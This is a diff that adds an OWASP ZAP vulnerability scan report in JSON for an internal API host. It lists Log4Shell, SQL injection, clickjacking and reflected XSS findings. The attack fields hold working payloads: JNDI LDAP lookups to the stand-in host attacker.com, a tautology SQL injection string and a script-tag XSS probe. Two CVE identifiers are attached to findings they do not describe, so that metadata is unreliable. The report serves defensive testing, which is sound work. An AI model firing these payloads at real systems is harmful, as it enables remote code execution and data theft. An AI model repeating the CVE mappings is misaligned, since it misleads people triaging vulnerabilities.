@@ -1,0 +1,125 @@
+{
+  "@programName": "OWASP ZAP",
+  "@version": "2.14.0",
+  "@generated": "Sat, 17 Feb 2026 00:05:00",
+  "site": [
+    {
+      "@name": "https://api.vertexai.internal:8080",
+      "@host": "api.vertexai.internal",
+      "@port": "8080",
+      "@ssl": "true",
+      "alerts": [
+        {
+          "pluginId": "40043",
+          "alertRef": "40043",
+          "alert": "Log4Shell - Remote Code Execution (CVE-2021-44228)",
+          "name": "Log4Shell - Remote Code Execution (CVE-2021-44228)",
+          "riskcode": "3",
+          "confidence": "3",
+          "riskdesc": "High (High)",
+          "desc": "Apache Log4j2 versions 2.0-beta9 to 2.14.1 allow remote code execution via JNDI lookups in logged user headers.",
+          "instances": [
+            {
+              "uri": "https://api.vertexai.internal:8080/api/v1/auth/login",
+              "method": "POST",
+              "param": "X-Api-Version",
+              "attack": "${jndi:ldap://attacker.com/a}",
+              "evidence": "Received DNS callback from 192.168.1.100"
+            },
+            {
+              "uri": "https://api.vertexai.internal:8080/api/v1/search",
+              "method": "GET",
+              "param": "q",
+              "attack": "${jndi:ldap://attacker.com/search}",
+              "evidence": "Received DNS callback from 192.168.1.100"
+            }
+          ],
+          "count": "2",
+          "solution": "Upgrade Apache Log4j to version 2.17.1 or higher.",
+          "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
+          "cweid": "94",
+          "wascid": "20",
+          "sourceid": "1",
+          "cve": "CVE-2021-44228"
+        },
+        {
+          "pluginId": "40018",
+          "alertRef": "40018",
+          "alert": "SQL Injection - PostgreSQL",
+          "name": "SQL Injection - PostgreSQL",
+          "riskcode": "3",
+          "confidence": "2",
+          "riskdesc": "High (Medium)",
+          "desc": "SQL injection vulnerability allows attackers to read or modify arbitrary database records.",
+          "instances": [
+            {
+              "uri": "https://api.vertexai.internal:8080/api/v1/reports/query",
+              "method": "POST",
+              "param": "filter_id",
+              "attack": "1' OR '1'='1",
+              "evidence": "PostgreSQL syntax error in statement"
+            }
+          ],
+          "count": "1",
+          "solution": "Use parameterized prepared statements.",
+          "reference": "https://owasp.org/www-community/attacks/SQL_Injection",
+          "cweid": "89",
+          "wascid": "19",
+          "sourceid": "1",
+          "cve": "CVE-2023-38606"
+        },
+        {
+          "pluginId": "10020",
+          "alertRef": "10020",
+          "alert": "Missing Anti-Clickjacking Header",
+          "name": "Missing Anti-Clickjacking Header",
+          "riskcode": "1",
+          "confidence": "3",
+          "riskdesc": "Low (High)",
+          "desc": "The response does not include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options to protect against Clickjacking.",
+          "instances": [
+            {
+              "uri": "https://api.vertexai.internal:8080/index.html",
+              "method": "GET",
+              "param": "",
+              "attack": "",
+              "evidence": ""
+            }
+          ],
+          "count": "1",
+          "solution": "Set X-Frame-Options: DENY or SAMEORIGIN on all HTTP responses.",
+          "reference": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
+          "cweid": "1021",
+          "wascid": "15",
+          "sourceid": "1"
+        },
+        {
+          "pluginId": "40012",
+          "alertRef": "40012",
+          "alert": "Cross-Site Scripting (Reflected)",
+          "name": "Cross-Site Scripting (Reflected)",
+          "riskcode": "2",
+          "confidence": "2",
+          "riskdesc": "Medium (Medium)",
+          "desc": "Reflected Cross-Site Scripting (XSS) occurs when an application includes unvalidated and unescaped user input in its output.",
+          "instances": [
+            {
+              "uri": "https://api.vertexai.internal:8080/api/v1/error?msg=%3Cscript%3Ealert(1)%3C/script%3E",
+              "method": "GET",
+              "param": "msg",
+              "attack": "<script>alert(1)</script>",
+              "evidence": "<script>alert(1)</script>"
+            }
+          ],
+          "count": "1",
+          "solution": "Contextually encode all untrusted data before rendering in the DOM.",
+          "reference": "https://owasp.org/www-community/attacks/xss/",
+          "cweid": "79",
+          "wascid": "8",
+          "sourceid": "1",
+          "cve": "CVE-2022-22965"
+        }
+      ]
+    }
+  ]
+}
